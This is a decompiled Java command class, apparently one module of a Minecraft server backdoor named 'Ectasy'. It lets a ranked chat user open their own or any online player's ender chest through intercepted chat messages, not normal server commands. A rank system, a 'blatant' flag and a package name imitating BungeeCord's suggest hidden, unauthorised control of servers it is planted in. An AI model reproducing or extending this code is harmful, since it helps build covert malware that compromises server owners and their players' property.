package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "echest",
   description = "View your or someone's echest.",
   blatant = false,
   rank = Rank.LITE,
   aliases = {"enderchest", "ec"}
)
public class EnderChestCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         Bukkit.getScheduler().runTask(Ectasy.parentPlugin, () -> {
            var1.getPlayer().openInventory(var1.getPlayer().getEnderChest());
         });
         ChatUtil.sendChat(var1.getPlayer(), "You are now viewing your ender chest.");
      } else {
         Player var4 = Bukkit.getServer().getPlayer(var3[0]);
         if (var4 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "The player " + var3[0] + " is not online.");
            return;
         }

         Bukkit.getScheduler().runTask(Ectasy.parentPlugin, () -> {
            var1.getPlayer().openInventory(var4.getEnderChest());
         });
         ChatUtil.sendChat(var1.getPlayer(), "You are now viewing your enderchest".replace("your", var4.getName() + "'s"));
      }
   }
}
